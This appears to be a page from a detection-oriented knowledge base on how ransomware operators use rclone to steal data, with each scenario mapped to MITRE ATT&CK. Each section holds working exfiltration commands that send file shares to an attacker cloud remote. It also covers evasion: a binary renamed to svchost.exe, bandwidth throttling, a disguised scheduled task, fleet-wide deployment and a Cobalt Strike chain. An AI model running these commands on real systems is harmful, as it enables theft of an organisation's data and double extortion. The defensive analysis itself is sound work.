# Rclone — Hands-On Use Cases

Every scenario below builds on the config-file/data-movement-verb model documented in `01 - Overview.md`. Command lines marked as sourced are drawn from published incident reporting (The DFIR Report, NCC Group, Red Canary, MITRE ATT&CK's own S1040 procedure list) — everything else is a direct, source-verified application of rclone's documented flags and syntax.

## Contents
- [Baseline Bulk Exfiltration to a Cloud Remote](#baseline-bulk-exfiltration-to-a-cloud-remote)
- [Renamed-Binary Execution](#renamed-binary-execution)
- [In-Memory / No-Config-File Operation](#in-memory--no-config-file-operation)
- [Recon Listing Before Exfiltration](#recon-listing-before-exfiltration)
- [Bandwidth-Throttled Exfiltration](#bandwidth-throttled-exfiltration)
- [Filtered Exfiltration by File Type or Path](#filtered-exfiltration-by-file-type-or-path)
- [Persistent Access via Mount or Serve](#persistent-access-via-mount-or-serve)
- [Dry-Run Recon Before Committing](#dry-run-recon-before-committing)
- [Config-Password Protection](#config-password-protection)
- [Scheduled/Persistent Exfiltration via a Wrapper Script](#scheduledpersistent-exfiltration-via-a-wrapper-script)
- [Fleet-Wide Deployment Across Multiple Hosts](#fleet-wide-deployment-across-multiple-hosts)
- [Chunker-Backed Transfer for Oversized Files](#chunker-backed-transfer-for-oversized-files)
- [Chained Workflow — C2-to-Rclone Post-Exploitation Task](#chained-workflow--c2-to-rclone-post-exploitation-task)

---

## Baseline Bulk Exfiltration to a Cloud Remote

**MITRE ATT&CK:** [T1567.002](https://attack.mitre.org/techniques/T1567/002/) (Exfiltration to Cloud Storage)

```
# Define the destination once
rclone config create exfil s3 provider=AWS access_key_id=AKIA... secret_access_key=wJalr... region=us-east-1

# Move an entire share to it
rclone copy "\\fileserver\Shares\Finance" exfil:databucket/finance --progress
```

The most direct realization of the tool's entire value proposition: a single `copy` invocation moves an arbitrarily large directory tree to attacker-controlled cloud storage over the provider's own legitimate API. `copy` is deliberately non-destructive — nothing is removed from the source, keeping the operation invisible to the victim's own file-integrity expectations. MITRE's own S1040 page names Dropbox, Google Drive, Amazon S3, and Mega as the specific destinations documented across real campaigns.

## Renamed-Binary Execution

**MITRE ATT&CK:** [T1036.005](https://attack.mitre.org/techniques/T1036/005/) (Masquerading: Match Legitimate Name or Location), alongside [T1567.002](https://attack.mitre.org/techniques/T1567/002/) for the exfiltration itself

```
svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\ServerName\C$\ShareName" ftp1:/DomainName/FILES/C/ShareName
```

This exact command line is drawn from The DFIR Report's 2021 **Sodinokibi (REvil)** case study — rclone was placed in `C:\Windows`, renamed `svchost.exe`, and paired with a matching config filename (`svchost.conf`) roughly **3.5 hours into the intrusion**, well before the ransomware deployment phase. Red Canary separately documented a copy renamed `sihosts.exe`; other public write-ups cite `TrendFileSecurityCheck.exe` — the specific name varies per operator, but the pattern (borrow a name that reads as a legitimate Windows/security process, place it in a plausible directory) is consistent across all three. **The PE's `OriginalFileName`/`ProductName` fields still say `rclone.exe`/"Rsync for cloud storage" regardless of the on-disk name or path** — this is the detail that defeats the masquerade, covered in `03`/`05`.

## In-Memory / No-Config-File Operation

**MITRE ATT&CK:** [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information) for the artifact-avoidance angle, [T1567.002](https://attack.mitre.org/techniques/T1567/002/) for the exfiltration

```
# Connection-string syntax defines the remote entirely on the command line —
# no rclone.conf is ever created or read
rclone copy "E:\Finance" ":s3,provider=AWS,access_key_id=AKIA...,secret_access_key=wJalr...,region=us-east-1:databucket/finance" --config ""
```

Rclone's own **connection-string** feature (`:backend,option=value,...:path`) lets every backend parameter be supplied inline instead of via a saved `[remote]` section — combined with `--config ""` (or `--config notfound`), no `rclone.conf` file is created or touched at all. This is a real, documented trade-off rather than a pure win for the operator: the entire credential set now sits in the process's command line and any command-line logging (Sysmon 1 / Security 4688) instead of a config file, which is often the *more* visible artifact of the two — see `05 - Detection and Hunting.md`'s priority table for why this evasion option doesn't actually defeat the strongest hunting signals.

## Recon Listing Before Exfiltration

**MITRE ATT&CK:** [T1083](https://attack.mitre.org/techniques/T1083/) (File and Directory Discovery)

```
rclone lsd exfil:                       # list top-level buckets/containers on the remote
rclone lsl "\\fileserver\Shares\HR"     # list files with size/modtime, source side
rclone size "\\fileserver\Shares\HR"    # total object count and byte size of a tree
```

`ls`/`lsd`/`lsl`/`size` are read-only — no data moves. MITRE's S1040 entry names this discovery pattern explicitly; in practice it's used both to confirm a destination remote is reachable and correctly configured before committing to a large transfer, and to scope how large an exfiltration job will actually be (informing `--bwlimit`/scheduling decisions below).

## Bandwidth-Throttled Exfiltration

**MITRE ATT&CK:** [T1567.002](https://attack.mitre.org/techniques/T1567/002/) — the throttling itself is an OPSEC/evasion choice layered on the same technique, not a distinct ID

```
# Cap outbound transfer at 2 MB/s, blending into a typical office-hours
# traffic baseline rather than saturating the link
rclone copy "\\fileserver\Shares\Finance" exfil:databucket/finance --bwlimit 2M --progress

# Time-of-day scheduled throttling — quieter during business hours,
# faster overnight
rclone copy "\\fileserver\Shares\Finance" exfil:databucket/finance --bwlimit "08:00,1M 20:00,10M"
```

`--bwlimit` accepts either a flat rate or a full time-based schedule (rclone's own `BwTimetable` syntax). An operator running a multi-hour or multi-day exfiltration job over a monitored link has a direct incentive to throttle below whatever volume threshold triggers network-anomaly alerting — this is the single clearest tell that an operator is deliberately trying to stay under a defender's radar rather than just moving data as fast as possible.

## Filtered Exfiltration by File Type or Path

**MITRE ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005/) (Data from Local System) / [T1039](https://attack.mitre.org/techniques/T1039/) (Data from Network Shared Drive) for the collection-scoping choice, feeding [T1567.002](https://attack.mitre.org/techniques/T1567/002/)

```
# Only office documents and PDFs, skip everything else
rclone copy "\\fileserver\Shares" exfil:databucket/docs --include "*.{docx,xlsx,pptx,pdf}" --progress

# Everything except backup/VM images, which are large and low intel value
rclone copy "\\fileserver\Shares" exfil:databucket/data --exclude "*.{vhdx,vmdk,bak}" --progress

# Load the include/exclude rules from a file instead of the command line —
# keeps the actual targeting criteria out of process command-line logging
rclone copy "\\fileserver\Shares" exfil:databucket/data --filter-from filters.txt
```

A full-tree `copy` is the loudest and slowest option; a targeted operator with a specific goal (financial records, source code, PII for double-extortion leverage) scopes the transfer with `--include`/`--exclude`/`--filter-from` instead. `--filter-from` is worth calling out specifically for its evasion value: the actual file-type/path targeting logic lives in a separate file rather than the command line itself, denying a command-line-content hunt the specific extensions/paths being targeted.

## Persistent Access via Mount or Serve

**MITRE ATT&CK:** [T1567.002](https://attack.mitre.org/techniques/T1567/002/), also touching [T1071](https://attack.mitre.org/techniques/T1071/) (Application Layer Protocol) for `serve`'s listener behavior

```
# Mount a cloud remote as a local drive letter — ongoing read/write access
# to attacker infrastructure that looks like local filesystem I/O
rclone mount exfil:databucket X: --vfs-cache-mode writes

# Inverse direction: expose a local directory (or another remote) as a
# WebDAV server an operator can pull from repeatedly without re-running rclone
rclone serve webdav "\\fileserver\Shares\Finance" --addr :8080 --user ops --pass "P@ssw0rd!"
```

Both directions turn a one-shot `copy` into a **standing channel** rather than a discrete transfer event. `mount` gives the operator's own tooling ordinary filesystem-API access to the remote (useful for browsing/selectively pulling files with non-rclone tools once mounted); `serve` runs the reverse — the compromised host itself becomes a small file server an operator returns to repeatedly. Either pattern produces a long-lived process and an open listening port/persistent outbound session rather than the tight process-creation-to-exit window a single `copy` leaves.

## Dry-Run Recon Before Committing

**MITRE ATT&CK:** [T1083](https://attack.mitre.org/techniques/T1083/) (File and Directory Discovery) — a verification step layered on whichever transfer is being planned

```
rclone copy "\\fileserver\Shares\Finance" exfil:databucket/finance --dry-run -vv
```

`--dry-run` reports exactly what would transfer (file count, total size, which files would be skipped) without moving a single byte — an operator's sanity check before committing to a large, slow, and more detectable real transfer. Seeing a `--dry-run` invocation in isolation is a leading indicator: it's frequently followed, sometimes hours later, by the real transfer with the same source/destination arguments and `--dry-run` removed.

## Config-Password Protection

**MITRE ATT&CK:** [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information)

```
# Encrypt the entire config file with a real password (interactive)
rclone config
# > select "Set configuration password"

# Supply that password non-interactively so a wrapper script can run unattended
set RCLONE_CONFIG_PASS=CorrectHorseBatteryStaple
rclone copy "\\fileserver\Shares\Finance" exfil:databucket/finance
```

Distinct from (and materially stronger than) the `--obscure` per-password obfuscation covered in `01`: this encrypts the whole `rclone.conf` file, defeating a plain-text read of a seized config. The `RCLONE_CONFIG_PASS` environment variable is the non-interactive unlock mechanism — and is itself a source-side artifact worth hunting for, since setting it inline on the same command/script line puts the real config password in process-environment/command-history evidence (see `03 - Source Evidence.md`).

## Scheduled/Persistent Exfiltration via a Wrapper Script

**MITRE ATT&CK:** [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task/Job: Scheduled Task) for the persistence mechanism, [T1567.002](https://attack.mitre.org/techniques/T1567/002/) for the recurring transfer

```batch
@echo off
rclone.exe copy "\\fileserver\Shares" exfil:databucket/nightly --bwlimit 2M --log-file C:\Windows\Temp\sync.log
```

```powershell
schtasks /create /tn "Windows Update Sync" /tr "C:\Windows\svchost_helper.bat" /sc daily /st 02:00 /ru SYSTEM
```

Wrapping a throttled `copy` in a batch/PowerShell script and firing it nightly via a disguised Scheduled Task turns a single exfiltration event into a recurring one — useful where the operator wants ongoing access to freshly modified data (combine with `--max-age 24h` to scope each run to the last day's changes) rather than a single bulk pull. See `../LOLBins/schtasks/` for the Scheduled Task artifact/event-ID story this technique rides on rather than re-deriving it here.

## Fleet-Wide Deployment Across Multiple Hosts

**MITRE ATT&CK:** [T1570](https://attack.mitre.org/techniques/T1570/) (Lateral Tool Transfer) for getting the binary/config onto each host, [T1567.002](https://attack.mitre.org/techniques/T1567/002/) for the exfiltration itself

```
# Push rclone.exe + a pre-staged rclone.conf to each target via an
# already-established lateral-movement channel, then execute
foreach ($target in Get-Content .\targets.txt) {
    Copy-Item .\rclone.exe,.\rclone.conf "\\$target\C$\Windows\Temp\"
    Invoke-Command -ComputerName $target -ScriptBlock {
        C:\Windows\Temp\rclone.exe copy "\\fileserver\Shares" exfil:databucket/$env:COMPUTERNAME --bwlimit 2M
    }
}
```

At scale — a ransomware affiliate touching dozens of hosts before deployment — rclone is typically pushed via whatever lateral-movement tooling is already in play (`Impacket/psexec`, `PsExec/`, Cobalt Strike's `jump`) rather than manually per host. The distinguishing evidence here is the same binary/config pair, or the same destination remote name, appearing across many hosts in a short window — see `05 - Detection and Hunting.md`'s fleet-wide sweep.

## Chunker-Backed Transfer for Oversized Files

**MITRE ATT&CK:** [T1030](https://attack.mitre.org/techniques/T1030/) (Data Transfer Size Limits)

```
rclone config create exfil-chunked chunker remote=exfil:databucket/finance chunk_size=100M
rclone copy "\\fileserver\Backups\database.bak" exfil-chunked:
```

The `chunker` overlay wraps an already-configured remote and transparently splits any file larger than `chunk_size` into pieces on upload, reassembling them on read. MITRE's own S1040 entry cites this specific mechanism as rclone's documented answer to a destination's per-file size ceiling (e.g. a provider that rejects single uploads above a few GB) — directly relevant to database dumps or full-disk images too large to move as one object.

## Chained Workflow — C2-to-Rclone Post-Exploitation Task

**MITRE ATT&CK:** Composite of the above — the realistic end-to-end shape documented across Conti, DarkSide, REvil/Sodinokibi, and the CISA Akira/BlackSuit advisories

```
1. C2 implant (Cobalt Strike Beacon, Sliver) already has an interactive session
   on a domain-joined host with SMB share read access (prior lateral movement)
2. Beacon `upload`s rclone.exe (renamed) + a pre-built rclone.conf, or writes
   the config via `shell`/`execute`
3. `shell svchost.exe --config svchost.conf --no-check-certificate copy
    "\\fileserver\Shares" ftp1:/exfil --bwlimit 5M`
4. Operator confirms completion via the C2 channel, then proceeds to the
   ransomware-deployment phase — exfiltration completing BEFORE encryption
   is the standard double-extortion sequencing seen across all of the
   ransomware families citing Rclone in MITRE's S1040 entry
```

This is the pattern CISA's #StopRansomware advisories for Akira and BlackSuit/Royal describe: Rclone is a late-stage, pre-encryption tool, run once broad domain access and target-data identification (the earlier stages this repo's `AdFind/` and `BloodHound/` pages cover) are already complete. See `../Cobalt Strike/02 - Hands-On Use Cases.md` for the C2 side of this chain and `../AdFind/02 - Hands-On Use Cases.md`'s own chained-workflow section for the recon phase that typically precedes it.
